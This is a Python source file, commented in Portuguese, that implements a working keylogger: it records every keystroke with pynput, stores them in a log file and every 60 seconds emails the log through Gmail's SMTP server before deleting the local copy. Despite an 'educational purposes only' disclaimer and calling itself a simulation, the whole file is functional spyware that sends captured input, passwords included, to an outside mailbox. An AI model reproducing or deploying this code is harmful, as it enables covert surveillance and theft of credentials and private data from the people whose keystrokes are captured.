# AVISO: APENAS PARA FINS EDUCACIONAIS.
# NÃO EXECUTE ESTE CÓDIGO NO COMPUTADOR DE NINGUÉM SEM PERMISSÃO EXPLÍCITA.

import pynput.keyboard
import threading
import smtplib
import os
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# --- Configurações (Preencha com seus dados de teste) ---
EMAIL_REMETENTE = "seu-email-de-teste@gmail.com"
SENHA_REMETENTE = "sua-senha-de-app-de-16-digitos" # Use a Senha de App!
EMAIL_DESTINATARIO = "seu-email-pessoal-para-receber@exemplo.com"

LOG_FILE = "key_log.txt" # Arquivo onde as teclas são salvas
TEMPO_REPORTAGEM_SEGUNDOS = 60 # Enviar e-mail a cada 60 segundos
# ----------------------------------------------------

class Keylogger:
    """
    Classe que simula um Keylogger simples.
    """
    def __init__(self, intervalo_segundos, email, senha, destinatario):
        print(f"Iniciando keylogger... Logs serão enviados a cada {intervalo_segundos}s.")
        self.intervalo = intervalo_segundos
        self.email = email
        self.senha = senha
        self.destinatario = destinatario
        self.log = "" # Buffer de log em memória
        self.listener = None # Objeto listener do pynput

    def _append_ao_log(self, string):
        """Adiciona ao buffer de log."""
        self.log += string

    def _processar_tecla_pressionada(self, tecla):
        """
        Callback chamado toda vez que uma tecla é pressionada.
        """
        try:
            # Tenta obter o caractere da tecla (ex: 'a', 'b', '1')
            self._append_ao_log(str(tecla.char))
        except AttributeError:
            # Se não for um caractere normal (ex: 'space', 'enter', 'ctrl')
            tecla_str = str(tecla)
            if tecla_str == "Key.space":
                self._append_ao_log(" ")
            elif tecla_str == "Key.enter":
                self._append_ao_log("\n[ENTER]\n")
            elif tecla_str == "Key.backspace":
                 self._append_ao_log("[BKS]")
            else:
                # Armazena a tecla especial (ex: [Key.ctrl_l])
                self._append_ao_log(f" [{tecla_str}] ")

    def _salvar_log_em_arquivo(self):
        """Salva o buffer de log atual no arquivo .txt"""
        if self.log: # Só salva se houver algo no log
            try:
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(self.log)
                
                # Limpa o buffer de memória após salvar
                self.log = "" 
            except Exception as e:
                print(f"Erro ao salvar log no arquivo: {e}")

    def _enviar_email_com_anexo(self):
        """
        Envia o arquivo de log por e-mail e depois o apaga.
        """
        # Primeiro, salva qualquer log restante no arquivo
        self._salvar_log_em_arquivo()
        
        # Verifica se o arquivo de log existe e não está vazio
        if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
            print("Log vazio. Nenhum e-mail enviado.")
            return # Não faz nada se o log estiver vazio

        print(f"Enviando log para {self.destinatario}...")
        
        # Configura a mensagem do e-mail
        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.destinatario
        msg['Subject'] = "Relatório de Log de Teclas (Simulação)"
        
        # Corpo do e-mail
        corpo = "Este é um relatório automático da simulação de keylogger."
        msg.attach(MIMEText(corpo, 'plain'))
        
        # Anexa o arquivo de log
        try:
            with open(LOG_FILE, "rb") as anexo_file:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(anexo_file.read())
            
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {LOG_FILE}")
            msg.attach(part)
        except Exception as e:
            print(f"Erro ao anexar arquivo: {e}")
            return
            
        # Conecta ao servidor SMTP (Gmail neste caso)
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls() # Inicia conexão segura
            server.login(self.email, self.senha)
            texto_msg = msg.as_string()
            server.sendmail(self.email, self.destinatario, texto_msg)
            server.quit()
            
            print("[SUCESSO] E-mail enviado.")
            
            # Limpa o arquivo de log após o envio bem-sucedido
            os.remove(LOG_FILE)
            print("Arquivo de log local limpo.")
            
        except Exception as e:
            print(f"[FALHA] Erro ao enviar e-mail: {e}")

    def _reportar(self):
        """
        Função que é executada em uma thread separada.
        A cada 'intervalo' de segundos, envia o log por e-mail.
        """
        while True:
            time.sleep(self.intervalo)
            self._enviar_email_com_anexo()

    def iniciar(self):
        """Inicia o listener de teclado e a thread de reportagem."""
        
        # Inicia o listener de teclado em uma thread
        self.listener = pynput.keyboard.Listener(on_press=self._processar_tecla_pressionada)
        
        # Usamos 'daemon=True' para que as threads terminem
        # quando o script principal for fechado (ex: Ctrl+C)
        with self.listener:
            # Inicia a thread de reportagem
            thread_reportagem = threading.Thread(target=self._reportar, daemon=True)
            thread_reportagem.start()
            
            # Mantém o listener rodando na thread principal
            print("Listener de teclado iniciado. Pressione Ctrl+C para parar.")
            self.listener.join()

if __name__ == "__main__":
    # Cria e inicia o keylogger
    meu_keylogger = Keylogger(
        intervalo_segundos=TEMPO_REPORTAGEM_SEGUNDOS,
        email=EMAIL_REMETENTE,
        senha=SENHA_REMETENTE,
        destinatario=EMAIL_DESTINATARIO
    )
    try:
        meu_keylogger.iniciar()
    except KeyboardInterrupt:
        print("\nSimulação de keylogger interrompida pelo usuário.")
        # Salva o log final antes de sair
        meu_keylogger._enviar_email_com_anexo()
